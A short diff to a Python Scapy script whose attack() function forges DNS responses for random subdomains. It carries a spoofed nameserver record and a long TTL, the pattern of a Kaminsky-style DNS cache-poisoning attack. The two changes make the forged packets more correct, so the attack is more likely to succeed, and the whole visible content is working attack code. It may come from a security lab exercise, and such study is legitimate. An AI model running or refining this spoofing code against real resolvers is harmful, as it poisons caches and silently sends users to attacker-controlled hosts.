@@ -70,7 +70,7 @@ def attack():
 		qd=DNSQR(qname=base_domain), 
 		an=DNSRR(rrname=base_domain, ttl=70000, rdata='1.2.3.4', rdlen=4, type=1),
 		ns=(DNSRR(rrname=base_domain, type='NS', ttl=70000, rdata=spoof)),
-        ar=NotImplemented
+        ar=None
 	)
     # qdcount=1, ancount=1, nscount=1, arcount=0
 
@@ -79,6 +79,7 @@ def attack():
         url = getRandomSubDomain() + '.' + base_domain
         dns_request[DNS].qd.qname = url
         fake_response[DNS].qd.qname = url
+        fake_response[DNS].an.rrname = url
         print "Now trying %s\n" % url
         print fake_response.show()
 
